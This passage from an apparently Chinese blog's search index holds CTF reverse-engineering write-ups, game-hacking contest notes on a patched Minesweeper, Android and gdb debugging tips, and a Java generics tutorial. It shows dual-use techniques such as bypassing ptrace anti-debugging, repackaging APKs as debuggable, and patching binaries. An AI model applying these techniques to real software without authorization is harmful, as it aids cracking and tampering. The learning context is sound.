0, 5, 4, 6, 7, 11, 9, 8, 10] ns = [0] * 24 for pos in range(24): ns[tbl[pos]] = t[pos] return ns c = change_format(0x22, 0x00cd0d496d3132d2) #初始状态,第一个参数是最高字节,第二个参数是低8字节 print(c) solver.solveCube(c) \"\"\" R F' R F R' F U' F' 题目中没有定义F2,F'这些操作,F2就是FF,F'就是FFF \"\"\" ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:7:3","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["notes"],"content":"ring3 ","date":"2020-04-05","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/:1:0","tags":null,"title":"腾讯游戏安全竞赛2020","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/"},{"categories":["notes"],"content":"从dmp文件中恢复出可执行文件 使用windbg open crash dump: 0:004\u003e lmvm winmine Browse full module list start end module name 01000000 01020000 winmine (deferred) Image path: D:\\Temp\\bin\\winmine.exe Image name: winmine.exe Browse all global symbols functions data Timestamp: Sat Aug 18 04:54:13 2001 (3B7D8475) CheckSum: 000273C4 ImageSize: 00020000 File version: 5.1.2600.0 Product version: 5.1.2600.0 File flags: 0 (Mask 3F) File OS: 40004 NT Win32 File type: 1.0 App File date: 00000000.00000000 Translations: 0804.04b0 Information from resource tables: CompanyName: Microsoft Corporation ProductName: Microsoft(R) Windows(R) Operating System InternalName: winmine OriginalFilename: WINMINE.EXE ProductVersion: 5.1.2600.0 FileVersion: 5.1.2600.0 (xpclient.010817-1148) FileDescription: Entertainment Pack Minesweeper Game LegalCopyright: (C) Microsoft Corporation. All rights reserved. 0:004\u003e .writemem D:\\winmine1.exe 01000000 L?20000 ","date":"2020-04-05","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/:1:1","tags":null,"title":"腾讯游戏安全竞赛2020","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/"},{"categories":["notes"],"content":"查找dump出的文件与原始文件指令的不同之处 #coding:utf-8 import capstone as cs with open('winmine.exe') as f: raw1 = f.read() with open('winmine1.exe') as f: raw2 = f.read() code1 = raw1[0x80c:0x80c+0x2a15] code2 = raw2[0x140c:0x140c+0x2a15] md32 = cs.Cs(cs.CS_ARCH_X86, cs.CS_MODE_32) def ext32(): discode1 = list(md32.disasm(code1, 0x0100140C)) discode2 = list(md32.disasm(code2, 0x0100140C)) length1 = len(discode1) length2 = len(discode2) j = 0 for i in range(length1): op1 = discode1[i].mnemonic ch1 = discode1[i].op_str op2 = discode2[j].mnemonic ch2 = discode2[j].op_str if op1 == op2 and ch1 == ch2: j = j + 1 else: address = discode1[i].address offset = address - 0x0100140C + 0x80c print \"\\noffset: \", hex(offset).strip('L') print \"address: \", hex(address).strip('L') print \"==========before=========\" print discode1[i - 1].mnemonic, discode1[i - 1].op_str print op1, ch1 print discode1[i + 1].mnemonic, discode1[i + 1].op_str print \"==========after=========\" print discode2[j - 1].mnemonic, discode2[j - 1].op_str print op2, ch2, if op2 == \"nop\": while op2 == \"nop\": j = j + 1 op2 = discode2[j].mnemonic if op2 == \"nop\": print op2, print \"\" print discode2[j].mnemonic, discode2[j].op_str else: j = j + 1 print \"\" print discode2[j].mnemonic, discode2[j].op_str if __name__ == \"__main__\": ext32() 执行结果如下 $ python cmp.py offset: 0x23f5 address: 0x1002ff5 ==========before========= jge 0x1003007 inc dword ptr [0x100579c] call 0x10028b5 ==========after========= jge 0x1003007 nop nop nop nop nop nop call 0x10028b5 offset: 0x2991 address: 0x1003591 ==========before========= call 0x1002eab push 0 jmp 0x10035ab ==========after========= call 0x1002eab jmp 0x10035b0 jmp 0x10035ab 可以看到有两处修改，分别位于0x23f5和0x2991处 ","date":"2020-04-05","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/:2:0","tags":null,"title":"腾讯游戏安全竞赛2020","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/"},{"categories":["notes"],"content":"指令修改的作用 分别对这两处进行分析可知0x23f5处执行修改的目的是停止计时，0x2991处指令修改的目的是即使踩雷也不会结束游戏。 ","date":"2020-04-05","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/:3:0","tags":null,"title":"腾讯游戏安全竞赛2020","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/"},{"categories":["notes"],"content":"ring0 膜大佬[跪] https://www.jianshu.com/p/daf0a914df3c ","date":"2020-04-05","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/:4:0","tags":null,"title":"腾讯游戏安全竞赛2020","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/"},{"categories":["notes"],"content":"IDA调试so 往年的腾讯的Android题都是native编程比较多，关键代码都在so文件里，先学习一下ida调试动态库。 ","date":"2020-04-01","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/:1:0","tags":null,"title":"Android调试","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"android常用命令行 Android中使用的shell命令 adb shell dumpsys * 常用的如下： activity 显示所有的Activity信息 查看Activity: adb shell dumpsys activity | findstr \"mFocusedActivity\" 查看顶部Activity: adb shell dumpsys activity top meminfo 内存信息 battery 电池信息 package 包信息 wifi 信息wifi信息 alarm 显示alarm信息 procstats 显示内存信息 adb shell dumpsys\u003e info info.txt 将命令行信息输出到txt中 文件操作 安装应用包apk文件 用法：adb install [apk文件] 覆盖或升级相同应用包apk文件 用法：adb install -r [apk文件] 卸载应用 用法：adb uninstall [packagename] 将设备中的文件放到本地 用法：adb pull 示例：adb pull /sdcard/Pictures/11.jpg D:\\gif 将手机中11.jpg的图片放置到电脑d盘中gif文件下 将本地文件放置到设备中 用法：adb push 查看当前运行应用程序日志 查看所有打印出来的日志信息 用法：adb logcat 查看某个标签名的日志信息 用法：adb logcat -s tag 示例如下：adb shell -s tag 查看标签为tag的日志 查看包含某个关键字或者进程名或者包名下的日志 用法：adb logcat |findstr pname/pid/keyword 示例如下：adb logcat |findstr com.android.coolweather 将日志输出到文件 用法：adb logcat -f 文件名 输出某一级别的日志 用法：adb logcat *:级别（注意：星号后面有个冒号） ","date":"2020-04-01","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/:1:1","tags":null,"title":"Android调试","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"调试 这个需要手机有root权限 安装应用: adb install -r xxx.apk 上传android_server文件:adb push android_server /data/local/tmp/ 可执行权限: adb shell chmod 777 /data/local/tmp/android_server 开启android_server与IDA通信:adb shell /data/local/tmp/android_server 本地端口转发:adb forward tcp:23946 tcp:23946 以调试模式启动程序:adb shell am start -D -n com.qq.gslab.regme/.MainActivity 启动IDA pro，点击Debugger-\u003eattach-\u003eRemote ARMLinux/Android debugger，输入localhost和相应端口号。 选择Debugger option，勾选 suspend on process entry point suspend on thread start/exit suspend on library load/unload 打开ddms查看相应apk进程的端口号，使用jdb恢复程序执行jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost 点击f9, 在ida弹出的”Add map”窗口中，一律点击”Cancle”按钮。 点击ida中的Debugger -\u003e Debugger windows -\u003e Module list 。在Modules窗口中找到要调试的so文件。 点击ida中的暂停调试按钮，暂停当前的调试 右击相应so文件，双击找到要调试的函数，再双击即可跳转到函数所在的起始地址，然后在地址处下断点 再按F9重新开始调试，即可看到程序成功地停在了断点处，到此处就可以正常地调试so文件了。 ","date":"2020-04-01","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/:1:2","tags":null,"title":"Android调试","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"JEB调试 ","date":"2020-04-01","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/:2:0","tags":null,"title":"Android调试","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"设置android:debuggable=“true” 使用apktool反编译apk，打开AndroidManifest文件，如果设置了android:debuggable=“true\"可以直接使用，如果没有，首先在application中添加android:debuggable=“true” 使用apktool重打包apk，apktool b dirpath xxx.apk 使用keytool生成keystore文件keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore，各个参数： -genkey 产生证书文件 -alias 产生别名 -keystore 指定密钥库的.keystore文件中 -keyalg 指定密钥的算法,这里指定为RSA(非对称密钥算法) -validity 为证书有效天数，这里我们写的是40000天 签名apk jarsigner -verbose -keystore demo.keystore xxx.apk demo.keystore -verbose 指定生成详细输出 -keystore 指定数字证书存储路径 5.jeb附加程序 https://www.jianshu.com/p/8e8ed503d69b 到这里为止可以调试smali代码了 ","date":"2020-04-01","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/:2:1","tags":null,"title":"Android调试","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%A4%A9-android%E8%B0%83%E8%AF%95/"},{"categories":["writeup"],"content":"crackRTF 是一个资源题，以前没见过，记录一下。 反编译一下: int __cdecl main_0(int argc, const char **argv, const char **envp) { DWORD v3; // eax DWORD v4; // eax CHAR String; // [esp+4Ch] [ebp-310h] int v7; // [esp+150h] [ebp-20Ch] CHAR String1; // [esp+154h] [ebp-208h] BYTE pbData; // [esp+258h] [ebp-104h] memset(\u0026pbData, 0, 0x104u); memset(\u0026String1, 0, 0x104u); v7 = 0; printf(\"pls input the first passwd(1): \"); scanf(\"%s\", \u0026pbData); if ( strlen((const char *)\u0026pbData) != 6 ) { printf(\"Must be 6 characters!\\n\"); ExitProcess(0); } v7 = atoi((const char *)\u0026pbData); if ( v7 \u003c 100000 ) //输入的password可以转化为小于100000的数字 ExitProcess(0); strcat((char *)\u0026pbData, \"@DBApp\"); v3 = strlen((const char *)\u0026pbData); sub_40100A(\u0026pbData, v3, \u0026String1); //求哈希值 if ( !_strcmpi(\u0026String1, \"6E32D0943418C2C33385BC35A1470250DD8923A9\") ) { printf(\"continue...\\n\\n\"); printf(\"pls input the first passwd(2): \"); memset(\u0026String, 0, 0x104u); scanf(\"%s\", \u0026String); if ( strlen(\u0026String) != 6 ) { printf(\"Must be 6 characters!\\n\"); ExitProcess(0); } strcat(\u0026String, (const char *)\u0026pbData); memset(\u0026String1, 0, 0x104u); v4 = strlen(\u0026String); sub_401019((BYTE *)\u0026String, v4, \u0026String1); if ( !_strcmpi(\"27019e688a4e62a649fd99cadaafdb4e\", \u0026String1) ) { if ( !sub_40100F(\u0026String) ) { printf(\"Error!!\\n\"); ExitProcess(0); } printf(\"bye ~~\\n\"); } } return 0; } 第一个密码是一个小于100000的数字，数字后面加上@DBApp后求哈希值，求哈希值的函数如下: int __cdecl sub_401230(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1) { int result; // eax DWORD i; // [esp+4Ch] [ebp-28h] CHAR String2; // [esp+50h] [ebp-24h] char v6[20]; // [esp+54h] [ebp-20h] DWORD pdwDataLen; // [esp+68h] [ebp-Ch] HCRYPTHASH phHash; // [esp+6Ch] [ebp-8h] HCRYPTPROV phProv; // [esp+70h] [ebp-4h] if ( !CryptAcquireContextA(\u0026phProv, 0, 0, 1u, 0xF0000000) ) return 0; if ( CryptCreateHash(phProv, 0x8004u, 0, 0, \u0026phHash) ) { if ( CryptHashData(phHash, pbData, dwDataLen, 0) ) { CryptGetHashParam(phHash, 2u, (BYTE *)v6, \u0026pdwDataLen, 0); *lpString1 = 0; for ( i = 0; i \u003c pdwDataLen; ++i ) { wsprintfA(\u0026String2, \"%02X\", (unsigned __int8)v6[i]); lstrcatA(lpString1, \u0026String2); } CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 1; } else { CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 0; } } else { CryptReleaseContext(phProv, 0); result = 0; } return result; } CryptCreateHash函数的第二个参数用来确定哈希函数的类型 0x8004 -\u003e SHA1, 0x800c -\u003e SHA256, 0x8003 -\u003e MD5 所以第一个密码是爆破SHA1，爆破范围是0-100000，爆破结果是123321 第二个输入是6字节的字符串，然后求MD5，我一开始的想法是爆破后来才知道超过4字节爆破是在想peach 继续往下走，在sub_40100F函数中调用了sub_4014D0 char __cdecl sub_4014D0(LPCSTR lpString) { LPCVOID lpBuffer; // [esp+50h] [ebp-1Ch] DWORD NumberOfBytesWritten; // [esp+58h] [ebp-14h] DWORD nNumberOfBytesToWrite; // [esp+5Ch] [ebp-10h] HGLOBAL hResData; // [esp+60h] [ebp-Ch] HRSRC hResInfo; // [esp+64h] [ebp-8h] HANDLE hFile; // [esp+68h] [ebp-4h] hFile = 0; hResData = 0; nNumberOfBytesToWrite = 0; NumberOfBytesWritten = 0; hResInfo = FindResourceA(0, (LPCSTR)0x65, \"AAA\"); if ( !hResInfo ) return 0; nNumberOfBytesToWrite = SizeofResource(0, hResInfo); hResData = LoadResource(0, hResInfo); if ( !hResData ) return 0; lpBuffer = LockResource(hResData); sub_401005(lpString, (int)lpBuffer, nNumberOfBytesToWrite); hFile = CreateFileA(\"dbapp.rtf\", 0x10000000u, 0, 0, 2u, 0x80u, 0); if ( hFile == (HANDLE)-1 ) return 0; if ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, \u0026NumberOfBytesWritten, 0) ) return 0; CloseHandle(hFile); return 1; } FindResourceA(0, (LPCSTR)0x65, “AAA”)函数用于寻找名称为AAA的资源文件，下面是关于windows中资源文件的的一些资料. VC使用自定义资源,FindResource,LoadResource,UnLockResource Windows MFC工程起步 使用ResourceHacker可以查找文件中的resource: 看到资源AAA中是一系列的字符串 sub_401005中将AAA中的字节与输入的6字节字符串进行异或，最终将结果写入dbapp.rtf中，用写字板随便写一个文件然后查看RTF文件格式 取前6个与AAA中的字符串异或就能得到passwd2 ","date":"2020-04-01","objectID":"/buuctf%E5%88%B7%E9%A2%98-1/:1:0","tags":null,"title":"BUUCTF刷题","uri":"/buuctf%E5%88%B7%E9%A2%98-1/"},{"categories":["writeup"],"content":"babyre 是SCTF2019的一道RE题，当时没做出来看了师傅的WP后明白了，后来看到Ex大佬的WP感觉大佬的做法好特别，记录一下。 首先是调试:因为前面有花指令无法F5只有看汇编+调试.文件是动态加载的, 无法确定断点位置, 我之前没调过这种, 查资料发现了attach的方法. 先运行可执行文件, 然后使用ps -aux | grep filename的方法查看进程号, 使用sudo gdb filename的方法运行gdb, 然后使用attach PID附加进程. 如果程序停留在库函数中可以使用finish命令快速跳过. 还有一些实用的指令: 1. 反向调试: 要求平台支持记录回放 reverse-step \u003c--- 反向运行程序到上一次被执行的源代码行。 reverse-stepi \u003c--- 反向运行程序到上一条机器指令 watch a \u003c--- 给变量a设置检查点,每次执行一条机器指令会打印出a在指令执行前后的值 record \u003c--- 启动进程回放 reverse-next \u003c--- 让程序倒退回到上一步的状态 2. 在启动gdb的时候附加的选项 -symbols \u003cfile\u003e -s \u003cfile\u003e 从指定文件中读取符号表。 -se file 从指定文件中读取符号表信息，并把他用在可执行文件中。 core \u003cfile\u003e -c \u003cfile\u003e 调试时core dump的core文件。 3.打印 x 按十六进制格式显示变量。 d 按十进制格式显示变量。 u 按十六进制格式显示无符号整型。 o 按八进制格式显示变量。 t 按二进制格式显示变量。 a 按十六进制格式显示变量。 c 按字符格式显示变量。 f 按浮点数格式显示变量。 (gdb) p i $21 = 101 (gdb) p/a i $22 = 0x65 (gdb) p/c i $23 = 101 'e' 查看文件中某变量的值： file::variable function::variable 可以通过这种形式指定你所想查看的变量，是哪个文件中的或是哪个函数中的。例如，查看文件f2.c中的全局变量x的值： (gdb) p 'f2.c'::x 查看数组的值, 比如数组的一段，或是动态分配的数据的大小。可以使用GDB的“@”操作符，“@”的左边是第一个内存的地址的值，“@”的右边是想查看内存的长度。 例如，程序中有这样的语句： int *array = (int *) malloc (len * sizeof (int)); 于是，在GDB调试过程中，可以以如下命令显示出这个动态数组的取值： p *array@len 二维数组打印 ----\u003e p **array@len 如果是静态数组的话，可以直接用print数组名，就可以显示数组中所有数据的内容了。 http://www.cppblog.com/chaosuper85/archive/2009/08/04/92123.html 4.断点 gdb断点分类： 以设置断点的命令分类： break 可以根据行号、函数、条件生成断点。 watch 监测变量或者表达式的值发生变化时产生断点。 catch 监测信号的产生。例如c++的throw，或者加载库的时候。 可以借助catch命令来反反调试： `catch syscall ptrace`会在发生ptrace调用的时候停下，因此在第二次停住的时候`set $rax=0`，从而绕过程序中`ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1`的判断 gdb中的变量从1开始标号，不同的断点采用变量标号同一管理，可以 用enable、disable等命令管理，同时支持断点范围的操作，比如有些命令接受断点范围作为参数。 例如：disable 5-8 break，tbreak ----\u003e 可以根据行号、函数、条件生成断点。tbreak设置方法与break相同，只不过tbreak只在断点停一次，过后会自动将断点删除，break需要手动控制断点的删除和使能。 多文件设置断点: 在进入指定函数时停住: C++中可以使用class::function或function(type,type)格式来指定函数名。如果有名称空间，可以使用namespace::class::function或者function(type,type)格式来指定函数名。 break filename:linenum ---\u003e 在源文件filename的linenum行处停住 break filename:function ---\u003e 在源文件filename的function函数的入口处停住 break class::function或function(type,type) （个人感觉这个比较方便，b 类名::函数名,执行后会提示如： \u003e\u003eb GamePerson::update Breakpoint 1 at 0x46b89e: file GamePerson.cpp, line 14. 在类class的function函数的入口处停住 break namespace::class::function ---\u003e 在名称空间为namespace的类class的function函数的入口处停住 until until line-number 继续运行直到到达指定行号，或者函数，地址等。 until line-number if condition info break \u003c--- 查看断点信息 (gdb) bt \u003c--- 查看函数堆栈。backtrace 打印当前的函数调用栈的所有信息。 #0 func (n=250) at tst.c:5 #1 0x080484e4 in main () at tst.c:24 #2 0x400409ed in __libc_start_main () from /lib/libc.so.6 一共有三关, 第一关是一个三维迷宫 第二关输入经过特定表表转换之后，不断左移累加，最终的转换结果需要与字符串“sctf_9102”相等 调试发现是一个4字节到3字节的转换关系, 进行爆破. 一般的爆破流程: data = [0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000003E, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000003F, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x0000003A, 0x0000003B, 0x0000003C, 0x0000003D, 0x0000007F, 0x0000007F, 0x0000007F, 0x00000040, 0x0000007F, 0x0000007F, 0x0000007F, 0x00000000, 0x00000001, 0x00000002, 0x00000003, 0x00000004, 0x00000005, 0x00000006, 0x00000007, 0x00000008, 0x00000009, 0x0000000A, 0x0000000B, 0x0000000C, 0x0000000D, 0x0000000E, 0x0000000F, 0x00000010, 0x00000011, 0x00000012, 0x00000013, 0x00000014, 0x00000015, 0x00000016, 0x00000017, 0x00000018, 0x00000019, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000007F, 0x0000001A, 0x0000001B, 0x0000001C, 0x0000001D, 0x0000001E, 0x0000001F, 0x00000020, 0x00000021, 0x00000022, 0x00000023, 0x00000024, 0x00000025, 0x00000026, 0x00000027, 0x00000028, 0x00000029, 0x0000002A, 0x0000002B, 0x0000002C, 0x0000002D, 0x0000002E, 0x","date":"2020-04-01","objectID":"/buuctf%E5%88%B7%E9%A2%98-1/:2:0","tags":null,"title":"BUUCTF刷题","uri":"/buuctf%E5%88%B7%E9%A2%98-1/"},{"categories":["writeup"],"content":"creakme 在main函数中，首先进行了一些预处理。sub_402320添加了SEH 添加SEH的基本步骤 在上图中1步骤之前和步骤2之后的SEH链分别如下: 安装完SEH后通过call ds:DebugBreak调用DebugBreak函数进入SEH, 在调试过程中发生中断会优先交给调试器处理,需要在SEH函数开始下断点后用Shift + F9运行才可以在SEH函数处暂停. SEH函数如下: 最终会调用0x4023EF函数,这个函数首先使用call ds:CheckRemoteDebuggerPresent和call ds:IsDebuggerPresent来检查程序是否被调试, 如果没有调试则进入sub_402450函数,这个函数会将0x404000后的0x200个字节与sycloversyclover进行异或 import idc addr = 0x404000 sy = \"sycloversyclover\" length = len(sy) for i in range(0x200): b = int(idc.Byte(addr + i)) idc.PatchByte(addr+i, ~(b ^ ord(sy[i % length]))) sub_4024A0首先使用__readfsdword(0x30u)检查程序是否被调试,然后调用404000函数,SMC后404000成了一个函数,用于修改最后的对比字符串。 最后在sub_4020D0中，对输入进行AES_CBC_128加密。密钥为’sycloversyclover’，IV为’sctfsctfsctfsctf’。这里的AES流程并不是正常的算法流程,这里使用了查表法,对比查表参数可以看出来是AES. 关于AES查表法的识别有下面的文章可以参考 逆向分析及识别恶意代码中的AES算法 ","date":"2020-04-01","objectID":"/buuctf%E5%88%B7%E9%A2%98-1/:3:0","tags":null,"title":"BUUCTF刷题","uri":"/buuctf%E5%88%B7%E9%A2%98-1/"},{"categories":["writeup"],"content":"BJDCTF_easy 下面代码中v2中用来存储v14转化为二进制的数值，v2[0]存储v14的最高位 while ( SHIDWORD(v14) \u003e 0 || v14 \u003e= 0 \u0026\u0026 v14 ) { v2[v16++] = ((SHIDWORD(v14) \u003e\u003e 31) ^ (((SHIDWORD(v14) \u003e\u003e 31) ^ v14) - (SHIDWORD(v14) \u003e\u003e 31)) \u0026 1) - (SHIDWORD(v14) \u003e\u003e 31); v14 /= 2LL; } #define SHIDWORD(x) (*((int32*)\u0026(x)+1)) 取变量X地址的下一个字节的地址并且解引用，最后得到的是地址中的值，通俗点讲就是X所在内存中的邻居 ","date":"2020-04-01","objectID":"/buuctf%E5%88%B7%E9%A2%98-1/:4:0","tags":null,"title":"BUUCTF刷题","uri":"/buuctf%E5%88%B7%E9%A2%98-1/"},{"categories":["writeup"],"content":"Java泛型 一个最基础的例子 List\u003cString\u003e arrayList = new ArrayList\u003cString\u003e(); 泛型有三种使用方式，分别为：泛型类、泛型接口、泛型方法 ","date":"2020-02-25","objectID":"/java-1/:0:0","tags":null,"title":"Java 泛型与回调","uri":"/java-1/"},{"categories":["writeup"],"content":"泛型类 泛型类型用于类的定义中，被称为泛型类。通过泛型可以完成对一组类的操作对外开放相同的接口。最典型的就是各种容器类，如：List、Set、Map。 一个最普通的泛型类: //此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型 //在实例化泛型类时，必须指定T的具体类型 public class Generic\u003cT\u003e{ //key这个成员变量的类型为T,T的类型由外部指定 private T key; public Generic(T key) { //泛型构造方法形参key的类型也为T，T的类型由外部指定 this.key = key; } public T getKey(){ //泛型方法getKey的返回值类型为T，T的类型由外部指定 return key; } } public static void main(String[] args) { //泛型的类型参数只能是类类型（包括自定义类），不能是简单类型:eg:不能用int只能用Integer //传入的实参类型需与泛型的类型参数类型相同，即为Integer. Generic\u003cInteger\u003e genericInteger = new Generic\u003cInteger\u003e(123456); //传入的实参类型需与泛型的类型参数类型相同，即为String. Generic\u003cString\u003e genericString = new Generic\u003cString\u003e(\"key_vlaue\"); Log.d(\"泛型测试\",\"key is \" + genericInteger.getKey()); Log.d(\"泛型测试\",\"key is \" + genericString.getKey()); } 泛型的类型参数只能是类类型（包括自定义类），不能是简单类型 在定义泛型类的时候并不一定要传输参数类型，在使用泛型的时候如果传入泛型实参，则会根据传入的泛型实参做相应的限制，此时泛型才会起到本应起到的限制作用。如果不传入泛型类型实参的话，在泛型类中使用泛型的方法或成员变量定义的类型可以为任何的类型。 Generic generic = new Generic(\"111111\"); Generic generic1 = new Generic(4444); //同样不会报错 ","date":"2020-02-25","objectID":"/java-1/:1:0","tags":null,"title":"Java 泛型与回调","uri":"/java-1/"},{"categories":["writeup"],"content":"泛型接口 泛型接口与泛型类的定义及使用基本相同 //定义一个泛型接口 public interface Generator\u003cT\u003e { public T next(); } 当实现泛型接口的类，未传入泛型实参时： /** * 未传入泛型实参时，与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中 * 即：class FruitGenerator\u003cT\u003e implements Generator\u003cT\u003e{ * 如果不声明泛型，如：class FruitGenerator implements Generator\u003cT\u003e，编译器会报错：\"Unknown class\" */ class FruitGenerator\u003cT\u003e implements Generator\u003cT\u003e{ @Override public T next() { return null; } } 当实现泛型接口的类，传入泛型实参时： /** * 传入泛型实参时： * 定义一个生产器实现这个接口,虽然我们只创建了一个泛型接口Generator\u003cT\u003e * 但是我们可以为T传入无数个实参，形成无数种类型的Generator接口。 * 在实现类实现泛型接口时，如已将泛型类型传入实参类型，则所有使用泛型的地方都要替换成传入的实参类型 * 即：Generator\u003cT\u003e, public T next();中的的T都要替换成传入的String类型。 */ public class FruitGenerator implements Generator\u003cString\u003e { private String[] fruits = new String[]{\"Apple\", \"Banana\", \"Pear\"}; @Override public String next() { Random rand = new Random(); return fruits[rand.nextInt(3)]; } } ","date":"2020-02-25","objectID":"/java-1/:2:0","tags":null,"title":"Java 泛型与回调","uri":"/java-1/"},{"categories":["writeup"],"content":"泛型方法 泛型类，是在实例化类的时候指明泛型的具体类型；泛型方法，是在调用方法的时候指明泛型的具体类型. public class GenericTest { //这个类是个泛型类，在上面已经介绍过 public class Generic\u003cT\u003e{ private T key; public Generic(T key) { this.key = key; } //我想说的其实是这个，虽然在方法中使用了泛型，但是这并不是一个泛型方法。 //这只是类中一个普通的成员方法，只不过他的返回值是在声明泛型类已经声明过的泛型。 //所以在这个方法中才可以继续使用 T 这个泛型。 public T getKey(){ return key; } } /** * 这才是一个真正的泛型方法。 * 首先在public与返回值之间的\u003cT\u003e必不可少，这表明这是一个泛型方法，并且声明了一个泛型T * 这个T可以出现在这个泛型方法的任意位置. * 泛型的数量也可以为任意多个 * 如：public \u003cT,K\u003e K showKeyName(Generic\u003cT\u003e container){ * ... * } */ public \u003cT\u003e T showKeyName(Generic\u003cT\u003e container){ System.out.println(\"container key :\" + container.getKey()); //当然这个例子举的不太合适，只是为了说明泛型方法的特性。 T test = container.getKey(); return test; } //这也不是一个泛型方法，这就是一个普通的方法，只是使用了Generic\u003cNumber\u003e这个泛型类做形参而已。 public void showKeyValue1(Generic\u003cNumber\u003e obj){ Log.d(\"泛型测试\",\"key value is \" + obj.getKey()); } //这也不是一个泛型方法，这也是一个普通的方法，只不过使用了泛型通配符? //同时这也印证了泛型通配符章节所描述的，?是一种类型实参，可以看做为Number等所有类的父类 public void showKeyValue2(Generic\u003c?\u003e obj){ Log.d(\"泛型测试\",\"key value is \" + obj.getKey()); } } 在泛型类中使用泛型方法的时候，泛型方法的参数类型不需要与泛型类的类型相同 泛型方法与可变参数 public \u003cT\u003e void printMsg( T... args){ for(T t : args){ Log.d(\"泛型测试\",\"t is \" + t); } } printMsg(\"111\",222,\"aaaa\",\"2323.4\",55.55); Java回调 回调的概念：举个例子就是，我们想要问别人一道题，我们把题跟对方说了一下，对方说好，等我做完这道题，我就告诉你，这个时候就用到了回调，因为我们并不知道对方什么时候会做完，而是对方做完了来主动找我们。 同步回调:代码运行到某一个位置的时候，如果遇到了需要回调的代码，会在这里等待，等待回调结果返回后再继续执行。 异步回调:代码执行到需要回调的代码的时候，并不会停下来，而是继续执行，当然可能过一会回调的结果会返回回来。 Callback.java public interface Callback { void printFinished(String msg); } Printer.java public class Printer { public void print(Callback callback, String text) { System.out.println(\"正在打印 . . . \"); try { Thread.currentThread(); Thread.sleep(3000);// 毫秒 } catch (Exception e) { } callback.printFinished(\"打印完成\"); } } People.java public class People { Printer printer = new Printer(); /* * 同步回调 */ public void goToPrintSyn(Callback callback, String text) { printer.print(callback, text); } /* * 异步回调 */ public void goToPrintASyn(Callback callback, String text) { new Thread(new Runnable() { public void run() { 